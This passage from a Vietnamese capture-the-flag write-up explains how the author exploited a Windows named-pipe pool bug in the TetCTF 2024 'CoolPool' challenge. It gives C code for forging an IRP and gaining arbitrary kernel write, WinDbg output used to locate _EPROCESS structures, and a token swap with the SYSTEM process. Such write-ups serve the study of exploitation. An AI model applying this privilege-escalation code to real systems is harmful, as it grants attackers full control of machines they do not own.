        for (int count = 0; count < 2; count++) {
            leakMem(ULONG64(ccb_entry.Flink - 0x18 + list_dq[count]), sizeof(NP_DATA_QUEUE), (UCHAR*)&data_queue);
            stop_entry = ccb_entry.Flink - 0x18 + list_dq[count];
            int max_iter = 0;
            while (stop_entry && max_iter < 100) {
                max_iter++;
                leakMem(ULONG64(data_queue.Queue.Flink), sizeof(DATA_QUEUE_ENTRY), (UCHAR*)&data_queue_entry);

                if (data_queue_entry.EntryType == Unbuffered && !isBlacklist(data_queue_entry.Irp) && data_queue_entry.Irp > 0xFFFFFFFF) {
                    printf("[+]Detect Irp : %llx\n", data_queue_entry.Irp);
                    return data_queue_entry.Irp;
                }
                if (stop_entry == data_queue_entry.Flink
                    || (data_queue_entry.Flink < 0xffffffff && data_queue_entry.Blink < 0xffffffff)) stop_entry = NULL;
            };
        };

        leakMem(ULONG64(ccb_entry.Flink), 0x10, (UCHAR*)&ccb_entry);
        if (ccb_entry.Flink == stop) break;
    }

    return NULL;
}

```

Phần tìm Control Context Block mình cũng làm tương tự

Và ở bên trên mình có sử dụng những hardcoded ở hàm `craft_write_entry` dòng `entry->Blink = entry->Flink = leakNewCCB() - 0x18 + 0xa8` , `0xa8` đó là offset từ CCB cho tới Queue , và `0x18` ở đây là offset từ CCB cho tới LIST_ENTRY CCB

Vậy là sau những bước trên thì chúng ta sẽ được

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706948102241/cc05c155-2f3d-437f-83bc-ed9b2623b6e6.png?auto=compress,format&format=webp)

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-insert-irp-to-list "Permalink")Insert IRP to List

Tiếp theo sau khi đã hoàn thành các công việc Leak `ForgeIRP` thì chúng ta cần chèn `ForgeIRP` vào trong LIST_ENTRY của Thread, để làm được việc này thì mình sẽ trigger bằng hàm `ReadFile(NamedPipeArray[leakPipe].Read, bufRead, 1, &BytesReturned, 0)` lúc này stack trace mong muốn sẽ là

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706947882152/7886e0d0-91d5-4709-b97d-44b426f0d8e0.png?auto=compress,format&format=webp)

Và khi đã trigger được thì phần chèn `ForgeIRP` sẽ nằm ở cuối của hàm `NpReadDataQueue`

Copy

Copy

```
// npfs.sys
PNP_DATA_QUEUE __fastcall NpReadDataQueue(
        PNP_DATA_QUEUE a1,
        PNP_DATA_QUEUE data_queue,
        char isPeek,
        char ReadOverflowOperation,
        __int64 userland_address,
        size_t Size,
        int a7,
        __int64 a8,
        PLIST_ENTRY LIST)
{
 //......CUT........
  if ( haswrite )
  {
    v29 = data_queue->Quota - data_queue->QuotaUsed;
    ByteOffset = data_queue->ByteOffset;
    next_entry = data_queue->Queue.Flink;
    if ( data_queue->Queue.Flink != data_queue )
    {
      while ( v29 )
      {
        irrp = next_entry->IRP;
        if ( next_entry->DataEntryType == Buffered )// is Buffered ?
        {
          if ( irrp )
          {
            v37 = next_entry->DataSize - ByteOffset;
            v38 = next_entry->QuotaInEntry;
            if ( v38 < v37 )
            {
              v39 = next_entry->DataSize - v38 - ByteOffset;
              v40 = v29;
              if ( v39 <= v29 )
                v40 = v39;
              v29 -= v40;
              v41 = v38 + v40;
              next_entry->QuotaInEntry = v41;
              if ( v41 == v37 )
              {
                if ( _InterlockedExchange64(&irrp->CancelRoutine, 0i64) )
                {
                  next_entry->IRP = 0i64;
                  irrp->IoStatus.Information = next_entry->DataSize;
                  irrp->IoStatus.Status = 0;
                  v42 = &irrp->Tail.Overlay.ListEntry;
                  v43 = LIST->Blink;

                  if ( v43->Flink != LIST ) // !!!
                    goto LABEL_110;
                  // insert to LIST_IRP of Thread
                  v42->ListEntry.Flink = LIST;
                  v42->ListEntry.Blink = v43;
                  v43->Flink = &v42->ListEntry;
                  LIST->Blink = &v42->ListEntry;
                }
              }
            }
          }
        }
        next_entry = next_entry->list_entry.Flink;
        ByteOffset = 0;
        if ( next_entry == data_queue )
          break;
      }
    }
    data_queue->QuotaUsed = data_queue->Quota - v29;
  }
  return a1;
}

```

Vậy là chúng ta đã hoàn thành Arbitrary Write!!

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-swap-token "Permalink")Swap Token

Để swap được thì chúng ta cần biết nó nằm ở đâu, ở mỗi process sẽ có một LIST_ENTRY tên là `ActiveProcessLinks` (_EPROCESS), nó sẽ link tất cả process với nhau nên từ một process bất kì các bạn có thể tìm được process tiếp theo. Nhưng bây giờ chúng ta cần phải tìm được một process bất kì, mình sẽ lợi dụng `ListThreadEntry` của IRP để làm điều này.

Các bạn có thể đọc thêm về [IRP](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp) để hiểu rõ hơn, mỗi IRP Object thì sẽ có trường là LIST_ENTRY`ThreadListEntry`, theo như mình reverse và đọc từ các nguồn khác thì mình thấy rằng Flink ở trường `ThreadListEntry` sẽ trỏ tới `_ETHREAD` của thread tương ứng đang yêu cầu IRP này, giả sử mình có một IRP như sau

Copy

Copy

```
1: kd> dt _IRP ffff860c33fd7710
ntdll!_IRP
   +0x000 Type             : 0n6
   +0x002 Size             : 0x358
   +0x004 AllocationProcessorNumber : 0
   +0x006 Reserved         : 0
   +0x008 MdlAddress       : (null)
   +0x010 Flags            : 0x60830
   +0x018 AssociatedIrp    : <anonymous-tag>
   +0x020 ThreadListEntry  : _LIST_ENTRY [ 0xffff860c`32ba5530 - 0xffff860c`3326f030 ]
   +0x030 IoStatus         : _IO_STATUS_BLOCK
   +0x040 RequestorMode    : 1 ''
   +0x041 PendingReturned  : 0 ''
   +0x042 StackCount       : 2 ''
   +0x043 CurrentLocation  : 1 ''
   +0x044 Cancel           : 0 ''
   +0x045 CancelIrql       : 0 ''
   +0x046 ApcEnvironment   : 0 ''
   +0x047 AllocationFlags  : 0x14 ''
   +0x048 UserIosb         : 0x00000000`0093b344 _IO_STATUS_BLOCK
   +0x050 UserEvent        : (null)
   +0x058 Overlay          : <anonymous-tag>
   +0x068 CancelRoutine    : 0xfffff804`5ead1010     void  Npfs!NpCancelDataQueueIrp+0
   +0x070 UserBuffer       : (null)
   +0x078 Tail             : <anonymous-tag>
1: kd> dt _LIST_ENTRY ffff860c33fd7710+20
ntdll!_LIST_ENTRY
 [ 0xffff860c`32ba5530 - 0xffff860c`3326f030 ]
   +0x000 Flink            : 0xffff860c`32ba5530 _LIST_ENTRY [ 0xffff860c`3326f030 - 0xffff860c`33fd7730 ]
   +0x008 Blink            : 0xffff860c`3326f030 _LIST_ENTRY [ 0xffff860c`33fd7730 - 0xffff860c`32ba5530 ]

```

Lúc này mình thử kiểm tra 2 pool ở `ThreadListHead`

Copy

Copy

```
1: kd> !pool 0xffff860c`32ba5530
Pool page ffff860c32ba5530 region is Nonpaged pool
*ffff860c32ba5000 size:  a00 previous size:    0  (Allocated) *Thre
        Pooltag Thre : Thread objects, Binary : nt!ps
 ffff860c32ba5a10 size:  290 previous size:    0  (Allocated)  MmCi
 ffff860c32ba5cb0 size:  290 previous size:    0  (Allocated)  MmCi
 ffff860c32ba5f40 size:   a0 previous size:    0  (Free)       ...Q
1: kd> !pool 0xffff860c`3326f030
Pool page ffff860c3326f030 region is Nonpaged pool
*ffff860c3326f000 size:  370 previous size:    0  (Allocated) *Irp
        Pooltag Irp  : Io, IRP packets
 ffff860c3326f380 size:  a00 previous size:    0  (Allocated)  Thre
 ffff860c3326fd90 size:  220 previous size:    0  (Allocated)  MmCi
 ffff860c3326ffb0 size:   30 previous size:    0  (Free)       ...Q

```

Flink thì sẽ được gán tag `Thread objects` và Blink là `Io, IRP packets` , để dễ hình dung hơn thì mình sẽ lấy tạm một `_ETHREAD` bất kì rồi lấy IRP trong list để kiểm tra

Copy

Copy

```
1: kd> !process 0 2 cmd.exe
PROCESS ffff860c337e1080
    SessionId: 1  Cid: 17fc    Peb: 02cd0000  ParentCid: 17b0
    DirBase: 68d37000  ObjectTable: ffffaa0f0761e180  HandleCount:  93.
    Image: cmd.exe

        THREAD ffff860c33ec9080  Cid 17fc.17b8  Teb: 0000000002cd2000 Win32Thread: 0000000000000000 WAIT: (Executive) KernelMode Alertable
            ffff860c343cef58  NotificationEvent

        THREAD ffff860c3350f300  Cid 17fc.12d4  Teb: 0000000002cd5000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable
            ffff860c340ca340  QueueObject

        THREAD ffff860c33e83580  Cid 17fc.1164  Teb: 0000000002cd8000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable
            ffff860c340ca340  QueueObject
1: kd> dt _ETHREAD ffff860c33ec9080 IrpList
ntdll!_ETHREAD
   +0x4b0 IrpList : _LIST_ENTRY [ 0xffff860c`347576a0 - 0xffff860c`347576a0 ]
1: kd> dq ffff860c33ec9080 + 0x4b0 L2 // IRPLIST
ffff860c`33ec9530  ffff860c`347576a0 ffff860c`347576a0
1: kd> !pool ffff860c`347576a0
Pool page ffff860c347576a0 region is Nonpaged pool
 ffff860c347570b0 size:  170 previous size:    0  (Allocated)  NtxF
 ffff860c34757220 size:  170 previous size:    0  (Allocated)  NtxF
 ffff860c34757390 size:  170 previous size:    0  (Allocated)  NtxF
 ffff860c34757500 size:  170 previous size:    0  (Allocated)  NtxF
*ffff860c34757670 size:  170 previous size:    0  (Allocated) *Irp
        Pooltag Irp  : Io, IRP packets
1: kd> ?? 0xffff860c347576a0 - 0xffff860c34757670 - 0x10 // Offset from IRP base to ThreadListEntry
unsigned int64 0x20
1: kd> dt _IRP ThreadListEntry
ntdll!_IRP
   +0x020 ThreadListEntry : _LIST_ENTRY

```

Như vậy là `IRP->ThreadListEntry->Flink` sẽ trỏ về `&_ETHREAD->IrpList` nên chúng ta đã leak thêm được một trường khá lớn là `_ETHREAD` và ở trong `_ETHREAD->Tcb` ([_KTHREAD](https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_KTHREAD)) lại có trường `Process`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1706955763021/d8eb54cc-c1da-4e80-a42d-25696a0a1ee5.png?auto=compress,format&format=webp)

Vậy là chúng ta đã có thể hoàn toàn lấy được `_EPROCESS` của một process bất kì chỉ dựa vào `IRP` Sau khi đã lấy được một process bất kì thì mình sẽ tiến hành tìm kiếm process của system và process của mình để swap token

Copy

Copy

```
ULONG64 GetProcessById(uint64_t first_process, uint64_t pid) {
    uint64_t current_pid = 0;
    uint64_t current_process = first_process;
    char data[0x1000];
    memset(data, 0x0, 0x1000);
    while (1) {
        leakMem(ULONG64(current_process + PID_OFFSET), 0x8, (UCHAR*)&current_pid);
        if (current_pid == pid)
            return current_process;

        leakMem(ULONG64(current_process + ACTIVELINKS_OFFSET), 0x8, (UCHAR*)&current_process);
        current_process -= PID_OFFSET + 0x8;
        if (current_process == first_process)
            return 0;
    }
}
void GetToken() {
    IRP irp_obj = *(IRP*)irp_data_saved;
    ULONG64 addr = 0;
    leakMem(ULONG64(irp_obj.ThreadListEntry.Flink + 0x38), 8, (UCHAR*)&addr);
    leakMem(ULONG64(addr-0x2c8), 8, (UCHAR*)&addr);
    ULONG64 current_proc = addr;
    printf("Current Process : %llx",current_proc);
    des_token = GetProcessById(current_proc, GetCurrentProcessId()) + 0x4b8;
    src_token = GetProcessById(current_proc, 4) + 0x4b8;
}

```

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-exploit-and-get-flag "Permalink")EXPLOIT AND GET FLAG

Như vậy là mình đã hoàn thành công việc swap token, tấn công trên server và lấy flag

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1721961283296/cdf5094f-9c65-4263-8217-c0fa7aabaf4c.png?auto=compress,format&format=webp)

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-source-code "Permalink")Source Code

[Ajomix/TetCTF2024-CoolPool (github.com)](https://github.com/Ajomix/TetCTF2024-CoolPool/tree/main)

### [](https://dungnm.hashnode.dev/pwn-coolpool-tetctf2024#heading-reference "Permalink")Reference

<https://www.vergiliusproject.com/>

[vportal/HEVD: HackSysExtremeVulnerableDriver exploits for latest Windows 10 version (github.com)](https://github.com/vportal/HEVD)

<https://doxygen.reactos.org/>

<https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation>

[wdfkd.wdfdriverinfo - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-wdfkd-wdfdriverinfo)
